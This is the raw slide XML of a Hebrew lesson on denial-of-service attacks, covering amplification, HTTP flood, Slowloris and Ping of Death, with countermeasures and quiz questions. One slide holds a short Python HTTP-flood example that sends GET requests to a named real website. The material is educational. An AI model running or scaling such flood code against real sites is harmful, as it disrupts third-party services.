              <a:t> לדוגמה, שליחה של בקשות המסיבות לעומס על בסיסי נתונים או על כל רכיב אחר שדורש משאבים.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>התקפת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Amplification</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>: </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> :DNS Amplification Attack</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>מנצלת את פרוטוקול </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> DNS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>כדי לשגר תעבורה גדולה מאוד לשרת היעד. התוקף שולח בקשות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>DNS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> מזויפות לשרתים ציבוריים עם כתובת ה-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> IP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>של היעד, והשרתים הללו שולחים תשובות גדולות מאוד שמציפות את השרת היעד.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>התקפת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>HTTP Flood</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> :HTTP Flood Attack</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>מתקפה המכוונת לפרוטוקול </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>HTTP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> שבו התוקף שולח בקשות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>HTTP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> רבות כדי למלא את רוחב הפס של השרת או להעמיס על היישום עצמו, מה שמוביל לירידה בביצועים או קריסת השרת.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="126754773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856D9C-5A5B-46B1-A051-EBCA1C6F21CE}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3627782" y="642594"/>
            <a:ext cx="7497417" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>המשך - התקפת מניעת שירות</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{CB580C39-8425-4606-A611-48970B6B4D93}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" sz="2400" b="1" u="sng" dirty="0"/>
              <a:t>דוגמאות נוספות</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>התקפת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>Slowloris</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: היא טכניקת התקפה שמביאה את השרת להיתקע על בקשות חיבור פתוחות. התוקף שולח בקשות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> HTTP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>חלקיות ומחזיק את החיבורים פתוחים ככל האפשר, מה שגורם לשרת להמתין לאישור של בקשות, ובכך מתרוקן מהמשאבים הנדרשים לטיפול בבקשות חדשות.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>התקפת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>:Ping of Death</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> היא התקפה ישנה שבה התוקף שולח מנות פינג גדולות מהרגיל (יותר מ-65,535 בתים) ליעד. השרת או המחשב היעד עלול לקרוס או להיתקל בבעיות בזיכרון בעקבות ניסיון לעבד מנות נתונים גדולות מדי.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="31210381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1762C3-5AA8-420E-9FB0-87D0111A65C4}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3687416" y="642594"/>
            <a:ext cx="7437783" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>המשך - התקפת מניעת שירות</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{20630D24-1F5F-436F-B35D-4376B046673E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1066800" y="2103120"/>
            <a:ext cx="10058400" cy="3204376"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="25000" lnSpcReduction="20000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" sz="7200" b="1" dirty="0"/>
              <a:t>טכניקות נגד</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="7200" b="1" dirty="0"/>
              <a:t> :Rate Limiting</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" sz="7200" dirty="0"/>
              <a:t>מגביל את מספר הבקשות שמגיעות מאותו מקור בפרק זמן מסוים. על ידי הגדרת גבולות, ניתן למנוע תעבורה מיותרת ולשמור על יציבות השירות.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="7200" b="1" dirty="0"/>
              <a:t> :Challenge-Response Tests</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" sz="7200" dirty="0"/>
              <a:t>משתמשים באתגרים כמו </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="7200" dirty="0"/>
              <a:t> CAPTCHA</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" sz="7200" dirty="0"/>
              <a:t>כדי לוודא שהבקשות מגיעות מלקוחות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" sz="7200" dirty="0" err="1"/>
              <a:t>אמיתיים</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" sz="7200" dirty="0"/>
              <a:t> ולא מבוטות.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="7200" b="1" dirty="0"/>
              <a:t>Load Balancers</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" sz="7200" b="1" dirty="0"/>
              <a:t>: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" sz="7200" dirty="0"/>
              <a:t>מפזרים את העומס על פני מספר שרתים כדי לשפר את יכולת ההתמודדות עם התקפות ולמנוע מהשרתים המרכזיים להיות מוצפים.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="7200" b="1" dirty="0"/>
              <a:t>Anycast</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" sz="7200" b="1" dirty="0"/>
              <a:t>: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" sz="7200" dirty="0"/>
              <a:t>טכניקת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="7200" dirty="0"/>
              <a:t> Anycast</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" sz="7200" dirty="0"/>
              <a:t>מאפשרת להפיץ תעבורה על פני מספר מיקומים גאוגרפיים, מה שמסייע בהפחתת העומס והגברת עמידות בפני התקפות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="7200" dirty="0"/>
              <a:t>DDoS</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="7200" b="1" dirty="0"/>
              <a:t> :Cloud-Based DDoS Protection Services</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" sz="7200" dirty="0"/>
              <a:t>שימוש בשירותים כמו </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="7200" dirty="0"/>
              <a:t>Cloudflare, Akamai</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" sz="7200" dirty="0"/>
              <a:t> או </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="7200" dirty="0"/>
              <a:t>AWS  Shield </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" sz="7200" dirty="0"/>
              <a:t>שמספקים הגנה מיוחדת והפחתה של התקפות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="7200" dirty="0"/>
              <a:t>DDoS</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="28000354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6894A3-7F09-43E0-9FB0-DE514CFD900C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3498574" y="642594"/>
            <a:ext cx="7626626" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>התקפת מניעת שירות - שאלות</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B3D2ECA9-11CB-4AD5-B1A3-07F7767961FC}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>1. מה ההבדל בין התקפת</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>DoS </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>להתקפת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>DDoS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> ?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>2. איך חומת אש יכולה לסייע במניעת התקפות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>DoS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> ?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>3. אילו צעדים ניתן לנקוט כדי להגן על שרתים מהתקפות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>HTTP Flood</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> ?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="38746507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9D89399-DFA5-497E-A1E5-714AEEDADA97}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3240156" y="642594"/>
            <a:ext cx="7885043" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>התקפת מניעת שירות - תשובות</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{7593BD7A-BDEF-4C88-91F8-BA01D1E61C66}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>1. התקפת</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>DoS </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> מבוצעת על ידי מחשב אחד או מקור אחד שמנסה למנוע את הגישה לשירות. לעומת זאת, התקפת</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>DDoS </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> כוללת מספר מחשבים המתקיפים את השרת בו זמנית, מה שמקשה עוד יותר על ההגנה.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>2. חומת אש יכולה לסנן תעבורה על פי חוקי אבטחה מוגדרים, ובכך למנוע גישה לבקשות חשודות או לא רצויות שמנסות למלא את השרת.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>3. ניתן להשתמש בחומות אש שמסננות תעבורה, בהגדרות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Rate Limiting</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>שמגבילות את מספר הבקשות, ולהשתמש בשירותי </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> CDN</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>שמפיצים את העומס על פני שרתים שונים.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="4525410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76C1B8-1D9C-4DAF-B7A0-28107356C08E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2504660" y="642594"/>
            <a:ext cx="8620539" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>התקפת מניעת שירות – שאלת קוד</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{5E08B024-916F-400C-8BBB-F8544677BBCE}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1066800" y="2103119"/>
            <a:ext cx="10058400" cy="4039263"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>import requests</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>url</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> = 'http://BoysTownJerusalem.com'  # </a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>def </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>simple_http_flood</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>():</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> # </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>שליחת 10 בקשות</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>for _ in range(10):</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>response = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>requests.get</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>url</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>        print(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>f"Status</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Code: {</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>response.status_code</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>}")</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>simple_http_flood</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>()</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>הסבר מה עושה הקוד הבא?</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="88401253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895E71-50B5-483C-814B-E7EA10562CE3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2415208" y="642594"/>
            <a:ext cx="8709991" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>התקפת מניעת שירות – תשובת קוד</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{736B5E7F-91E9-4DFE-9405-247506BACF09}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>הקוד פשוט מדמה התקפת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>HTTP Flood </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> על שרת. הקוד צריך לשלוח בקשות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>GET</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> חוזרות לאתר אינטרנט מסוים.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>היינו, השתמשנו בספריית </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>requests</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> שמשמשת לשליחת בקשות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>HTT </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> ב-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Python </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>, ובנוסף השתמשנו </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>בפונקצית</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>simple_http_flood</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> שהיא שולחת 10 בקשות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>GET</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> לאתר היעד ומדפיסה את קוד הסטטוס של התגובה.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="26048631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9083A61C-83A5-4AB8-944C-FC516FCAD278}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="he-IL" sz="8800" dirty="0"/>
              <a:t>התקפת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="8800" dirty="0"/>
              <a:t>XSS</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" sz="8800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="93385887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2FBD398-F77A-4509-A71E-8F79AE213481}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7881730" y="642594"/>
            <a:ext cx="3243470" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>התקפת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>XSS</a:t>
            </a:r>
